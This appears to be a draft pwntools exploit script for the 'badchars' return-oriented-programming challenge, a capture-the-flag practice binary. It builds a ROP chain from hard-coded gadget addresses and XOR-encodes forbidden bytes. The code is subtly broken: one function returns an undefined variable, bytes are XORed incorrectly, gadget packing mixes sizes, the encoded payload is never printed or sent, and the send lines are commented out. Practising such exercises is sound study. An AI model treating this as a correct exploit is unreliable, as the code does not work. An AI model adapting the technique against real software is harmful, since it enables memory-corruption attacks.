#!/usr/bin/env python3
from pwn import *
import sys

nop = b"\x90"
null = b"\x00"
counter = 0

key = b"\x0A"
badchars = bytearray(b"\x78\x67\x61\x2e")

pop_r14_r15 = p64(0x00000000004006a0)
xor_r15_r14 = p64(0x0000000000400628)


def PrintBytes(label: str, buffer: bytes):
	print(label)
	print(''.join('\\x{:02x}'.format(x) for x in buffer))


def CheckBadByte(c: chr) -> bool:
	global counter

	for i in range(len(badchars)):
		if c == badchars[i].to_bytes(1, 'little'):
			counter += 1
			return True
	return False


def XorCipher(c: chr) -> bytes:
	global key

	c ^= key
	if CheckBadByte(c):
		print(" ! bad bytes detected in encoded payload. Get wrecked")
		exit(1)

	return array


def Generate(buffer: bytes) -> bytes:
	global key

	array = []
	for i in range(len(buffer)):
		c = buffer[i].to_bytes(1, 'little')

		if CheckBadByte(c):
			print(" * found {} bad bytes -> {} ".format(counter, bytes(c)))

			packer = pop_r14_r15 + key + XorCipher(c) + xor_r15_r14
			array.append(packer)
		else:
			array.append(c)
	return array


if __name__ == "__main__":

	p = process("badchars")
	context.update(arch="amd64", os="linux")

	if len(sys.argv) > 1:
		if sys.argv[1] == "gdb":
			gdb.attach(p)
		else:
			print(" ! unkown option {}".format(sys.argv[1]))
			exit(1)

	length = 0x2
	payload = nop * (length + 8)

	for i in range(len(badchars)):
		payload += badchars[i].to_bytes(1,'little')

	PrintBytes("[*] payload before checks", payload)

	final = Generate(payload)
	PrintBytes("[*] payload after checks", payload)

	#p.send(final)
	#print(p.recvall())

